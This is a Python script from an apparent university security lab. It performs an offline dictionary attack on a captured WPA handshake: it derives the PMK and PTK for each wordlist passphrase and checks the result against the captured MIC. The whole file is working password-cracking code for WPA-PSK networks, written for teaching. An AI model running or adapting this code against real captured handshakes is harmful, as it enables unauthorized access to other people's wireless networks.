#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derivate WPA keys from Passphrase and 4-way handshake info

Calcule le MIC en réalisant une attaque par dictionnaire sur la passphrase afin de trouver la PMK. Si le MIC calculé
est égal au MIC trouvé dans le fichier, la passphrase utilisée est correcte
"""

__author__ = "Abraham Rubinstein et Yann Lederrey"
__modified__ = "Alexandra Cerottini et Nicolas Ogi"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

from binascii import a2b_hex, b2a_hex

from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key
from scapy.layers.dot11 import Dot11, Dot11Beacon
from scapy.layers.eap import *

from pbkdf2 import *


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


# read capture file -- it contains beacon, authentication, association, handshake and data
wpa = rdpcap("wpa_handshake.cap")

# important parameters for key derivation - most of them can be obtained from the pcap file
A = "Pairwise key expansion"  # this string is used in the pseudo-random function

# "SWI"
# wpa[0] is the first packet of the capture that contains a beacon frame, so we can get the SSID
ssid = wpa[0][Dot11Beacon].info.decode()

# "cebcc8fdcab7"
# wpa[5] represents the first message of the 4-way handshake and contains the AP mac address
APmac = a2b_hex(wpa[5][Dot11].addr2.replace(':', ''))
# "0013efd015bd"
# wpa[5] represents the first message of the 4-way handshake and contains the client mac address
Clientmac = a2b_hex(wpa[5][Dot11].addr1.replace(':', ''))


# "90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91"
# wpa[5] represents the first message of the 4-way handshake and contains the nonce generated by the AP
ANonce = wpa[5][WPA_key].nonce
# "7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577"
# wpa[6] represents the second message of the 4-way handshake and contains the nonce generated by the client
SNonce = wpa[6][WPA_key].nonce

# "36eef66540fa801ceee2fea9b7929b40"
# wpa[8] represents the last message of the 4-way handshake and contains the MIC that will be tested
mic_to_test = wpa[8][WPA_key].wpa_key_mic

B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
                                                                              SNonce)  # used in pseudo-random function
# set the MIC key to 0 before getting the data
wpa[8][WPA_key].wpa_key_mic = 0

# "0103005f02030a000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000
#  0000000000000000000000000000000000000000000000000000000000000000000000000000000000"
# wpa[8] represents the last message of the 4-way handshake and contains the data that will be used to calculate the MIC
data = bytes(wpa[8][EAPOL])

print("\n\nValues used to derivate keys")
print("============================")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(APmac), "\n")
print("Client Mac: ", b2a_hex(Clientmac), "\n")
print("AP Nonce: ", b2a_hex(ANonce), "\n")
print("Client Nonce: ", b2a_hex(SNonce), "\n")

# iterate on the wordlist to find the correct passphrase
f = open('./wordlist.txt', 'r')
for passPhrase in f.read().splitlines():
    passPhrase = str.encode(passPhrase)
    encoded_ssid = str.encode(ssid)

    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, passPhrase, encoded_ssid, 4096, 32)

    # expand PMK to obtain PTK
    ptk = customPRF512(pmk, str.encode(A), B)

    # calculate MIC over EAPOL payload (Michael)- The PTK is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16], data, hashlib.sha1)

    # the 4 last bytes must be removed of the MIC because SHA-1 returned 20 bytes but the MIC is only 16 bytes long
    if mic.hexdigest()[:-8] == mic_to_test.hex():
        print("\nPassphrase found ! \"" + passPhrase.decode() + "\"")
        print("\nResults of the key expansion")
        print("=============================")
        print("PMK:\t\t", pmk.hex(), "\n")
        print("PTK:\t\t", ptk.hex(), "\n")
        print("KCK:\t\t", ptk[0:16].hex(), "\n")
        print("KEK:\t\t", ptk[16:32].hex(), "\n")
        print("TK:\t\t", ptk[32:48].hex(), "\n")
        print("MICK:\t\t", ptk[48:64].hex(), "\n")
        print("MIC:\t\t", mic.hexdigest(), "\n")
        break
